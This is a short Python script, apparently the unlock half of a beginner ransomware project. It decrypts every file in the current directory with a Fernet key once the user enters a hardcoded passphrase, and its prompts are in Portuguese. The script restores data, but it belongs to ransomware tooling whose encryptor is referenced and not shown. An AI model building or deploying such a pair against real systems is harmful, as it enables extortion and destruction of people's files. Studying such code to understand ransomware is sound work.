import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "ransonware.py" or file =="thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()
passphrase = "Cy3erS3c"
uppassword = input("Digite a senha para descriptografar os arquivos: ")
if uppassword == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
            print("Você recuperou seus arquivos!")
else:
    print("Senha inválida.")
